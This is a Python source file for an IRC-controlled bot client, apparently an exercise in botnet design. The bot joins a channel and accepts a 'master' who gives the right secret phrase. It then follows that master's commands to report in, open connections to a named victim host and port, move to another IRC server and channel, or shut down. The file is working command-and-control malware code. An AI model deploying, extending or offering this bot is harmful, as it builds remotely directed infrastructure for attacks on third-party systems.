import sys, os
import socket
import select

def checkMaster(response, secretphase, temp_master):
    if temp_master != "":
        return temp_master
    try:
        temp_master = response.split("!", 1)[0]
        temp_master = temp_master.split(":", 2)[1]

        size = len(response.split())
        temp_secret = response.split(" ", size)[size-1]
        temp_secret = (temp_secret.split(":", 2)[1]).strip("\r\n")

        if temp_secret == secretphase:
            print("found master, named " + temp_master + ", secret is " + temp_secret)
            return temp_master
        else: return ""
    except:
        return ""


def joinIRC(irc):
    # some initialising stuff
    number = 1
    nickname = "NotYourSlave"+str(number)
    irc.send(bytes("USER notabot 8 * : I'm OK\r\n", "utf-8"))
    irc.send(bytes("NICK " + nickname + "\r\n", "utf-8"))

    response = (irc.recv(1024)).decode("utf-8")
    print(response)
    while "Nickname is already in use" in response:
        number = number + 1
        nickname = "NotYourSlave" + str(number)
        irc.send(bytes("NICK " + nickname + "\r\n", "utf-8"))
        response = (irc.recv(1024)).decode("utf-8")
    irc.send(bytes("JOIN #" + channel + "\r\n", "utf-8"))
    return nickname

try:
    hostname = sys.argv[1]
    port = int(sys.argv[2])
    channel = sys.argv[3]
    secretphase = sys.argv[4]
except:
    print("must state host name, port, channel, and secret phase\n\rexiting...", file=sys.stderr)
    sys.exit(-1)

# connect to irc
nickname = ""
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# try to connect, wait 5 seconds
irc.settimeout(5)
while 1:
    try:
        irc.connect((hostname, port))
        irc.settimeout(None)    # if reached here, it reconnected, yay
        nickname = joinIRC(irc)
        break
    except socket.timeout:
        print("timeout, time to go home")
        sys.exit(-1) # timeout, just give up and quit
    except Exception as e:
        continue

atk_count = 0
fail_count = 0
master = ""

while 1:
    response = (irc.recv(1024)).decode("utf-8")

    if response == "":  # if connection is closed
        # try to reconnect
        irc.close()
        irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        irc.settimeout(5)
        print("attempting to reconnect")
        while 1:
            try:
                irc.connect((hostname, port))
                irc.settimeout(None)    # if reached here, it reconnected, yay
                print("reconnection success")
                nickname = joinIRC(irc)
                break
            except socket.timeout:
                print("timeout, time to go home")
                sys.exit(-1) # timeout, just give up and quit
            except Exception as e:
                continue


    print(response)
    master = checkMaster(response, secretphase, master)


    if response.split(" ", 1)[0] == "PING":
        argument = response.split(" ", 2)[1]
        irc.send(bytes("PONG " + argument + "\r\n", "utf-8"))

    # controller's status
    if "To me, my minions" in response and master != "":
        irc.send(bytes("PRIVMSG " + master + " :" + nickname +"\r\n", "utf-8"))

    # controller's attack
    if "Attack" in response and master != "":
        victim = response.split(":Attack ", 2)[1]
        atk_host = victim.split(" ", 1)[0]
        atk_port = victim.split(" ", 2)[1]
        atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        atk.settimeout(1)
        try:
            atk.connect((atk_host, int(atk_port)))
        except:
            atk.settimeout(None)
            irc.send(bytes("PRIVMSG " + master + " :attack unsuccessful\r\n", "utf-8"))
            atk.close()
            continue
        atk.settimeout(None)
        atk.close()
        irc.send(bytes("PRIVMSG " + master + "  :attack successful\r\n", "utf-8"))

    # controller's move
    if "Move" in response and master != "":
        try:
            victim = response.split(":Move ", 2)[1]
            move_host = victim.split(" ", 1)[0]
            move_port = victim.split(" ", 2)[1]
            move_channel = victim.split(" ", 3)[2]
            move = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            move.settimeout(1)
            try:
                move.connect((move_host, int(move_port)))
            except:
                move.settimeout(None)
                irc.send(bytes("PRIVMSG " + master + " :move unsuccessful\r\n", "utf-8"))
                move.close()
                continue
            move.settimeout(None)
            irc.send(bytes("PRIVMSG " + master + " :move successful\r\n", "utf-8"))
            irc.send(bytes(b"QUIT\r\n"))
            irc.close()
            irc = move
            hostname = move_host
            port = int(move_port)
            channel = move_channel
            # get inside the channel
            joinIRC(irc)
        except:
            irc.send(bytes("PRIVMSG " + master + " :move unsuccessful\r\n", "utf-8"))

    # controller's shutdown
    if "Go home, guys" in response and master != "":
        irc.send(bytes("QUIT\r\n", "utf-8"))
        sys.exit(0)
